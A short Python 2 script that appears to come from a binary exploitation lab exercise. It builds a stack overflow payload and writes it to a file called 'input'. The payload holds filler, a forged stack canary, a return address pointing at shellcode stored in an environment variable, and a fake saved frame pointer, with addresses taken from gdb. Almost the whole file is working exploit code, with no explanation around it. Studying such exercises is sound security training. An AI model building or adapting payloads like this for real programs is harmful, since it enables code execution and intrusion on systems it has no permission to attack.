#!/usr/bin/env python2

import os
import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)   # < little-endian;  I unsigned int

def p64(n):
    return struct.pack("<Q", n)   # Q unsigned long long

def ps(n,s):
    return struct.pack(str(n)+'s', s)   # s  char[]

if __name__ == '__main__':

    # assert is used to check if binary is correct
    assert p32(0x12345678) == b'\x78\x56\x34\x12'                     # 4 bytes in m32 
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'     # 8 bytes in m64
    assert ps(4, 'aaaa') == b'\x61\x61\x61\x61'

    Dummy = p32(0x88888888)
    Canary = p32(0xff0a0d00)
    JmpToEnv = p32(0xffffc792)  # ./getenv EGG
    FakeEbp = p32(0xffffbfe4)  # 0xffffbf74 + 0x60 (OFFSET between inside and outside of gdb) + 0x10 (OFFSET inside buffer)

    buf = Dummy + Canary + JmpToEnv + Dummy*17 + FakeEbp

    with open("input", 'wb') as fout:
        fout.write(buf)


